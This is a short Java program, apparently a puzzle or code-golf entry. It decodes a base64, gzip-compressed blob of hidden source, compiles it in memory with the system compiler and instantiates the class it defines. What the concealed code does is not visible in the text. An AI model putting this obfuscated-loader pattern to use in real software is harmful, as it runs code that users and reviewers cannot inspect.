import javax.tools.*;
import java.io.*;
import java.net.*;
import java.util.*;
import java.util.zip.*;

class D2 extends SimpleJavaFileObject
{
    D2()
    {
        super(URI.create(""),Kind.SOURCE);
    }

    public static void main(String[]_) throws Exception
    {
        ToolProvider.getSystemJavaCompiler().getTask(null, null, null, null, null, Arrays.asList(new D2())).call();
        Class.forName("T").newInstance();
    }

    public String getCharContent(boolean _) throws IOException
    {
        byte[] s = new byte[671];
        new GZIPInputStream(new ByteArrayInputStream(Base64.getDecoder().decode("H4sIAAAAAAAAAHWR3U4bMRCFX2WxRDXDbgxbokrgGC7aXrVqK4FQpSgXluPAIK93tXbAaci7dzZZRFW1N/6Z8Zk585maru1T8WiezCrLdSIvTxS9Bf8biql3puGM9SbG4nZLIRXdfKGDey74PK8vPiyqrOup+koxFXafuHM2tT1gFdUt4PbGmhBcX5h9crzBzSYm10gKKNfRfXKeGkocF5VA9fxA3oGRDyZ+czkBYjfPx/VU6/r9dS71+WVZ5oU2MuyzXGXp8vcViJ8Cy1qtuHvWZyrP2J/KZYlbK613hk2plW/bJQzVqnxaT1HRCo6spPi56dIG8B1ErcPa+5cXKyP9coCzOB4Q458TWlS7cY52nWTXMxIfXvXX4kxcvipLUeirQpRxZMqmG9OBm1wJECUAKxHgh6EeHcp7l7449jKpWVgV/3xwZ/zajU9QoLSt92wLPh72to/ysaVA4R6GEuxd7Z5aWhYHAMNP5mpYN7hlBN28np5smOqRPhtwmeUShlGHjpCrDcsHrIOAGC3NLhQx2AM824ZkKMQ3BZ2eT+qSGxwPO6txbPtXXO12u988r0N4nwIAAA=="))).read(s);
        return new String(s);
    }
}
